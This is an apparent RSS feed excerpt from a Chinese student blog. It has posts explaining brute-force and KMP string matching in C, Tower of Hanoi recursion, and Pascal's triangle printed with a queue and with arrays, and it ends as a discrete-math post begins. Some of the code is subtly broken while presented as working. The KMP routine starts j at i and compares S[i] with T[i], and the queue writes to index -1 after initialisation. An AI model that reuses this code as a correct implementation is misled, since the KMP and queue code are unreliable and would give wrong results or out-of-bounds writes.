      <title>模式匹配算法——KMP的从理解到不懂到再会的历程</title>
      <link>https://www.los-kos.cn/posts/bf-kmp/</link>
      <guid>https://www.los-kos.cn/posts/bf-kmp/</guid>
      <pubDate>Tue, 07 Apr 2020 10:20:00 GMT</pubDate>
      <description>
      
        对KMP算法的深度研究
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博文基于我之前的数据结构那篇文章，里面的”串”那一章最后剩下的KMP算法没有讲；</p><p>今天上课，老师成功地把我会的KMP讲成不会的啦（没说讲的不好）🙃</p><h1 id="BF算法"><a href="#BF算法" class="headerlink" title="BF算法"></a>BF算法</h1><p>先讲讲BF算法：</p><p><strong>暴风(Brute Force)算法是普通的模式匹配算法，BF算法的思想就是将目标串S的第一个字符与模式串T的第一个字</strong></p><p><strong>符进行匹配，若相等，则继续比较S的第二个字符和 T的第二个字符；若不相等，则比较S的第二个字符和T的第一</strong></p><p><strong>个字符，依次比较下去，直到得出最后的匹配结果。BF算法是一种暴力算法。</strong></p><p>看下它的代码实现：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BF</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span></span></span><br><span class="line"><span class="function"></span>{   <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k; </span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="built_in">strlen</span>(S) &amp;&amp; j &lt; <span class="built_in">strlen</span>(T)) </span><br><span class="line">{ </span><br><span class="line"><span class="keyword">if</span> (S[i] == T[j]) </span><br><span class="line">{ </span><br><span class="line">i++; </span><br><span class="line">j++; </span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">{ </span><br><span class="line">i = i - j + <span class="number">1</span>; j = <span class="number">0</span>; </span><br><span class="line">}</span><br><span class="line">} </span><br><span class="line"><span class="keyword">if</span> (j &gt;= <span class="built_in">strlen</span>(T)) </span><br><span class="line">{ </span><br><span class="line">k = i - <span class="built_in">strlen</span>(T) + <span class="number">1</span>; </span><br><span class="line">} </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">k = <span class="number">0</span>; </span><br><span class="line">} </span><br><span class="line"><span class="keyword">return</span> k; </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> pos;</span><br><span class="line">    <span class="keyword">char</span> S[<span class="number">100</span>],T[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s %s"</span>,S,T);</span><br><span class="line">pos = BF(S,T);</span><br><span class="line"><span class="keyword">if</span>(pos) </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"S存在与T相同的子串，位置为第%d个\n"</span>,pos);</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"S不存在与T相同的子串\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种算法也是可以找到匹配的位置，但是效率不高，<strong>时间复杂度为O(M*N);</strong></p><h1 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1><p>既然BF算法效率不高，那就寻找一种简便的方法来实现相同的功能——KMP；</p><p><strong>KMP算法：D.E.Knuth、J.H.Morris、V.R.Pratt发表的一个模式匹配算法，可以大大避免重复遍历（减少回</strong></p><p><strong>溯）的情况，称之为克努特—莫里斯—普拉特算法，简称为KMP算法；</strong></p><p>直接上代码，这里没法解释</p><h3 id="获取next数组："><a href="#获取next数组：" class="headerlink" title="获取next数组："></a>获取next数组：</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get_Next</span><span class="params">(<span class="keyword">char</span> *T,<span class="keyword">int</span> *next)</span></span></span><br><span class="line"><span class="function"></span>{   </span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line">next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="built_in">strlen</span>(T))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>||T[i]==T[j])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">next[i] = j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">j = next[j];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>注意！！！！</strong></p><p><strong>这里数组下标是从1开始的，但是数组默认从0开始，所以在调用这个函数的时候，不能直接：</strong></p><p><strong>// scanf(“%s”,S); Get_Next(S,next);</strong></p><p><strong><em>如果这样写，100%错的（自闭一晚上才看出来，可见博主是多么菜）</em></strong>😭😭</p><p><strong><em>然后，就…没有然后了，555555</em></strong></p><p><strong>算了，还是改进一下吧，把数组从0开始赋值：</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get_Next</span><span class="params">(<span class="keyword">char</span> *T,<span class="keyword">int</span> *next)</span></span></span><br><span class="line"><span class="function"></span>{   </span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="built_in">strlen</span>(T)<span class="number">-1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">-1</span>||T[i]==T[j])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">next[i] = j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">j = next[j];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样写就可以直接输入串了，不用考虑下标问题了……</p><h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><p>无话可说，代码很好懂😀</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="keyword">char</span> *S,<span class="keyword">char</span> *T,<span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = i;</span><br><span class="line"><span class="keyword">int</span> next[<span class="number">100</span>];</span><br><span class="line">Get_Next(T,next);</span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="built_in">strlen</span>(S)&amp;&amp;j&lt;=<span class="built_in">strlen</span>(T))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>||S[i]==T[i])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">j = next[j];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="built_in">strlen</span>(T))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> i-<span class="built_in">strlen</span>(T);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>KMP算法的时间复杂度为O(M+N);</strong></p><p>对比BF算法的时间复杂度，显然，KMP好一些；</p><p>.</p><p>.</p><p>无</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/bf-kmp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>记一次有趣的东西及数据结构作业</title>
      <link>https://www.los-kos.cn/posts/shujujiegouhome/</link>
      <guid>https://www.los-kos.cn/posts/shujujiegouhome/</guid>
      <pubDate>Tue, 07 Apr 2020 01:20:00 GMT</pubDate>
      <description>
      
        来一次数据结构的头脑风暴
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>最近复习数据结构，发现了一些有趣的东西，哈哈哈，记录一下；</p><a id="more"></a><h1 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h1><p>汉诺塔相信大家都略有耳闻，这里就不多解释；</p><p>数据结构课上，讲到了汉诺塔问题——“利用递归求解移动过程”，那我就不得不拿出来以前的代码（不，还是自己</p><p>回忆写一下比较好😄），这个其实早就学过了，之前刷acm的题目，做过好几道汉诺塔问题，但是没这么简单😭</p><p>话不多说，直接上code：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>; <span class="comment">//全局变量，计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> x,<span class="keyword">char</span> y)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%c-&gt;%c\n"</span>,x,y); <span class="comment">//x柱拿一个圆盘移动到y柱</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> a,<span class="keyword">char</span> b,<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>) <span class="comment">//只有一个圆盘</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">move</span>(a,c); <span class="comment">//直接从a移动到c</span></span><br><span class="line">count ++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">hanoi(n<span class="number">-1</span>,a,c,b); <span class="comment">//n-1个圆盘从a借助c移动到b</span></span><br><span class="line"><span class="built_in">move</span>(a,c); <span class="comment">//a中剩下的一个圆盘移动到c</span></span><br><span class="line">count ++;</span><br><span class="line">hanoi(n<span class="number">-1</span>,b,a,c); <span class="comment">//移动到b的n-1个圆盘从b借助a移动到c</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入圆盘数："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">hanoi(n,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n需要移动的次数为：%d"</span>,count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>汉诺塔问题算是纯递归的啦，很简单呐😜</p><h1 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h1><h3 id="队列实现"><a href="#队列实现" class="headerlink" title="队列实现"></a>队列实现</h3><p>这个是老师留的作业，哇，好难写，这真够我写一晚上的啦</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    ElemType data[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> front,rear;</span><br><span class="line">}Queue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(Queue *Q)</span> <span class="comment">//初始化队列</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EmptyQueue</span><span class="params">(Queue *Q)</span> <span class="comment">//判断队列是否为空</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> Q-&gt;rear == Q-&gt;front;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(Queue *Q, ElemType e)</span> <span class="comment">//入队 </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == MAXSIZE)</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    Q-&gt;data[Q-&gt;rear] = e;</span><br><span class="line">    Q-&gt;rear ++;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(Queue *Q,ElemType *e)</span> <span class="comment">//出队</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == Q-&gt;front)</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    *e = Q-&gt;data[Q-&gt;front];</span><br><span class="line">    Q-&gt;front ++;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHeadData</span><span class="params">(Queue *Q,ElemType *e)</span> <span class="comment">//获取队头元素</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(EmptyQueue(Q))</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">        *e = Q-&gt;data[Q-&gt;front];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yanghui</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//杨辉三角实现函数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Queue Q;</span><br><span class="line">    <span class="keyword">int</span> i,x,e,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);  <span class="comment">//单独打印第一行数字1 ，需要控制格式 </span></span><br><span class="line">    }   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1\n"</span>); <span class="comment">// print(1) </span></span><br><span class="line">    </span><br><span class="line">    InitQueue(&amp;Q);</span><br><span class="line">    EnQueue(&amp;Q,<span class="number">0</span>);</span><br><span class="line">    EnQueue(&amp;Q,<span class="number">1</span>);</span><br><span class="line">    EnQueue(&amp;Q,<span class="number">1</span>); <span class="comment">//队列初始化 </span></span><br><span class="line">    <span class="keyword">while</span>(++k&lt;n) <span class="comment">//输出后n-1行 </span></span><br><span class="line">{</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n-k;i++)</span><br><span class="line">{</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"   "</span>); <span class="comment">//控制格式，采取"3的倍数格式控制" </span></span><br><span class="line">        }</span><br><span class="line">        EnQueue(&amp;Q,<span class="number">0</span>); <span class="comment">//入队0，为while和if判断 </span></span><br><span class="line">e = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(e!=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">        DeQueue(&amp;Q,&amp;x);</span><br><span class="line">            GetHeadData(&amp;Q,&amp;e);</span><br><span class="line">            <span class="keyword">if</span>(e)</span><br><span class="line">{</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%-6d"</span>,e);</span><br><span class="line">            }</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            EnQueue(&amp;Q,x+e); <span class="comment">//入队-&gt;每个数等于它上方两数之和 </span></span><br><span class="line">}</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入需要打印的行数："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    yanghui(n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92_%E9%98%9F%E5%88%97.png" alt="杨辉三角_队列"></p><h3 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h3><p>杨辉三角用C语言打印更简单！！🙃</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> n,i,j,k,a[<span class="number">100</span>][<span class="number">100</span>];  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入需要打印的行数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    {</span><br><span class="line">    a[i][<span class="number">1</span>] = a[i][i] = <span class="number">1</span>;  <span class="comment">//每一行第一个和最后一个数字为1 </span></span><br><span class="line">} </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">3</span>;i&lt;=n;i++) <span class="comment">//这里从第三行开始，因为前两行全部是数字1，已经赋值完毕 </span></span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">2</span>;j&lt;=i<span class="number">-1</span>;j++) <span class="comment">//每一行从第二个数字开始 </span></span><br><span class="line">        {</span><br><span class="line">        a[i][j]=a[i<span class="number">-1</span>][j<span class="number">-1</span>]+a[i<span class="number">-1</span>][j]; <span class="comment">//每个数字等于它上方两数之和 </span></span><br><span class="line">}</span><br><span class="line">}            </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) <span class="comment">//从第一行开始输出 </span></span><br><span class="line">{</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">1</span>;k&lt;=n-i+<span class="number">1</span>;k++) <span class="comment">//控制格式 </span></span><br><span class="line">        {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>); </span><br><span class="line">}</span><br><span class="line">           </span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)  </span><br><span class="line">        {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%-6d"</span>,a[i][j]); <span class="comment">//左对齐，输出 </span></span><br><span class="line">} </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);  </span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92_C%E8%AF%AD%E8%A8%80.png" alt="杨辉三角_C语言"></p><h3 id="小结😋"><a href="#小结😋" class="headerlink" title="小结😋"></a>小结😋</h3><p>数据结构挺好玩的，我之前的blog有整理，欢迎大家去康康😁</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/shujujiegouhome/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Discrete Math的学习历程</title>
      <link>https://www.los-kos.cn/posts/discrete-math/</link>
      <guid>https://www.los-kos.cn/posts/discrete-math/</guid>
      <pubDate>Mon, 06 Apr 2020 05:20:00 GMT</pubDate>
      <description>
      
        带你走进离散数学的神秘世界
      
      </description>
      
      
